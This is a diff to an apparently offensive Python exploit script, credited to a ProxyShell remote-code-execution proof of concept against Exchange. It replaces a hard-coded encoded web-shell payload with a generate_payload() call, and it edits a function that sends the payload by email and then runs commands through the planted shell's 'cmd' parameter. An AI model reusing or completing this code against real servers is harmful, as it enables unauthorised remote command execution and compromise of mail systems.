@@ -144,10 +144,8 @@ def rand_subject(n=6):
     return ''.join(random.choices(string.ascii_lowercase, k=n))
 
 def send_email_contains_malicious_payload():
-    # # encoded_payload = generate_payload()
     # Trying to find the way to encode the right payload in python ... 
-    # Credits: https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell_rce.py#L238
-    encoded_payload = "ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoLZnl33BlQUt9MGObmp39opINOpDYzJ6Z45OTk52qWpzYy+2lz32tYUfoLaddpUKVTTDdqCD2uC9wbWqV3agskxvtrWadMG1trzRAYNMZ45OTk5IZ6V+9ZUhrdpFNk="
+    encoded_payload = generate_payload()
     subject_id = rand_subject(16)
     print (f"[-] Sending email contains payload with subject id: {subject_id}")
     email_body = f"""
@@ -265,7 +263,7 @@ def shell(command: str, port):
                         r = requests.get(
                             shell_url,
                             params={
-                                'exec_code':exec_code
+                                'cmd':exec_code
                             },
                             verify=False
                         )
